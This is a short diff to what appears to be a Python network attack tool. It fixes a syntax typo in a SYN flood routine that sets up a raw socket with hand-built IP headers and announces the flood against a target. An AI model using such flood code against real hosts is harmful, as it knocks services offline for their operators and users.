@@ -437,7 +437,7 @@ Example:
 		synsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
 		synsock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
 		ts = []
-		threads = []u
+		threads = []
 		print(colored('[*] Started SYN Flood: ', 'blue') + colored(tgt, 'red'))
 		while 1:
 			if args.i == False:
